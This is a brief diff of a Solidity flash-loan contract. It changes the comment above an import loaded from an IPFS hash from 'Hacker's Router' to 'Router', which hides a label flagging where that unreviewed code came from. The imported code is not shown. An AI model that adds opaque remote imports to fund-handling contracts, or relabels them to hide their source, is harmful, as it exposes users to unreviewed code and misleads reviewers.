@@ -5,7 +5,7 @@ pragma solidity ^0.5.0;
 import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
 import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";
 
-// Hacker's Router
+// Router
 import "ipfs://QmS7fnEFwFfgqBYsT7eDgh6VvrmASHDR8ZQ1uLV3AoiPaJ";
 
 //Uniswap Smart contracts
